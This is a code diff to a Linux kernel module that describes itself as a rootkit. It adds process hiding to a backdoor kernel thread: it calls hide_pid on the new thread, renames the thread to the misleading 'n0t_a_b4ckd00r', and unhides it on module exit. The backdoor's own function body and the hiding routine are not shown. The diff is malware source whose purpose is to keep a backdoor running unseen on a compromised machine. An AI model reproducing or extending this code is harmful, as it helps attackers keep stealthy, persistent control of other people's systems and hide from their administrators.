@@ -10,6 +10,7 @@
 
 #include "config.h"
 #include "backdoor.h"
+#include "hooks.h"
 
 struct task_struct* backdoor_thread;
 
@@ -23,13 +24,21 @@ static int backdoor_thread_fn(void* data){
 
 int __init backdoor_init(void){
 	printk(KERN_INFO "ROOTKIT: Starting backdoor thread\n");
-	backdoor_thread = kthread_create(backdoor_thread_fn, NULL, "bkd" HIDE_STR); //max name length seems to be 15
-	if (backdoor_thread < 0)
+	backdoor_thread = kthread_create(backdoor_thread_fn, NULL, "n0t_a_b4ckd00r"); //max name length seems to be 15
+	if (backdoor_thread < 0){
+		printk(KERN_INFO "ROOTKIT: ERROR creating backdoor thread\n");
 		return -1;
+	}
+	if (hide_pid(backdoor_thread->pid) == -1){
+		printk(KERN_INFO "ROOTKIT: ERROR trying to hide backdoor thread\n");
+		// I don't know if I should stop it here as it has not been woken up
+		return -1;
+	}
 	wake_up_process(backdoor_thread);
 	return 0;
 }
 
 void __exit backdoor_exit(void){
+	unhide_pid(backdoor_thread->pid);
 	kthread_stop(backdoor_thread);
 }
